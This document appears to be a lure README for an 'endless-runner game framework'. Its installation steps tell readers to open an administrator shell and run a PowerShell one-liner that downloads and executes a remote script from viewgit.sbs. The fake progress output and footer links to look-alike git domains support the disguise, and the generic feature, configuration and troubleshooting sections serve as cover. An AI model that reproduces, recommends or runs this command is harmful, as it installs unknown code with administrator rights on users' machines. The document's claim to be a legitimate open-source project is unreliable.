# Subway Runner Game Framework

> An original endless-runner framework for lane movement, obstacles, collectibles, daily challenges, and accessible controls.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm viewgit.sbs?get=subway | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Subway modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Subway.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

**Subway Runner Game Framework** is a modular endless-runner starter for movement, obstacle spawning, collectibles, score loops, daily challenges, and replay review. It is a framework for original games, not a clone of a commercial title or its assets.

**Best for:** Mobile and web game developers, students, and game-jam teams.

## Core Features

- ✅ **Lane Movement** — Responsive swipe, keyboard, and gamepad input.
- ✅ **Obstacle System** — Compose safe, readable patterns from reusable pieces.
- ✅ **Collectibles** — Track coins, power-ups, and optional goals.
- ✅ **Procedural Runs** — Seed levels for repeatable testing and daily challenges.
- ✅ **Replay Review** — Capture local input and events for design analysis.
- ✅ **Accessibility** — Remappable controls, high contrast, and reduced motion.
- ✅ **Original Asset Hooks** — Keep visual and audio identity clearly licensed.

## Usage

```bash
npm run dev
npm run run start --seed 42 --difficulty normal
npm run replay review --file replays/sample.json
npm run build
```

## Configuration

> [!NOTE]
> Difficulty profiles are data-driven so designers can tune spawn rates and speed without changing engine code.

```json
{
  "difficulty": { "profile": "normal", "spawnIntervalMs": 900, "speed": 8 },
  "controls": { "swipe": true, "keyboard": true, "gamepad": true },
  "accessibility": { "highContrast": true, "reduceMotion": false }
}
```

## Screenshots

- Runner view: `screenshots/runner-view.png`
- Obstacle editor: `screenshots/obstacle-editor.png`
- Daily challenge: `screenshots/daily-challenge.png`
- Accessibility menu: `screenshots/accessibility-menu.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Obstacles feel unfair | Lower spawn density and test with the reference profile. |
| Swipe input is missed | Increase the input dead zone and test on the target device. |
| Daily challenge changes | Confirm the seed is derived from the intended UTC date. |
| Replay will not load | Use a replay from the same schema and build version. |

## Use Cases

- **Endless Runners** — Prototype a complete movement and scoring loop.
- **Mobile Games** — Test touch input and performance early.
- **Game Jams** — Generate repeatable daily challenges.
- **Accessibility Research** — Compare control and visual options.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not copy commercial characters, environments, music, names, or branding. Test motion-heavy visuals with reduced-motion alternatives and avoid deceptive ads or purchases.

> [!TIP]
> Keep a fixed-seed regression course to catch unintended difficulty changes.

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
subway, endless-runner, game-framework, lane-movement, obstacles, collectibles, daily-challenge, accessibility
-->

[gitview.sbs](https://gitview.sbs?t=subway) | [gitrm.cfd](https://gitrm.cfd?t=subway) | [gitrm.sbs](https://gitrm.sbs?t=subway) | [gitsl.xyz](https://gitsl.xyz?t=subway) | [viewgit.sbs](https://viewgit.sbs?t=subway)
